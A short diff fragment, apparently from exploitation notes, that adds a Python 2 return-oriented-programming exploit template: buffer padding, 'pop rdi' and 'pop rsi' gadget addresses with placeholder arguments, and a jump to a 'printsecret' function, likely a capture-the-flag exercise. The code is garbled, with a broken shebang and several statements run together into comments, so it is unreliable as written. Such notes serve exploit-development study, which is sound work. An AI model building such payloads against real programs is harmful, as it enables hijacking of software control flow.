@@ -57,3 +57,13 @@ offset - BaseAddress
 ```
 
 ```
+
+```
+!/usr/bin/env python2 
+# python template to generate ROP exploit from struct import pack 
+
+p = '' 
+p += "A" * 14 
+p += pack('<Q', 0x00007ffff7dccb72) # pop rdi ; ret 
+p += pack('<Q', 0x0000000012345678) # p += pack('<Q', 0x00007ffff7dcf04f) # pop rsi ; ret p += pack('<Q', 0x00000000deadbeef) # p += pack('<Q', 0x000000000040127a) # Address of printsecret print p
+```
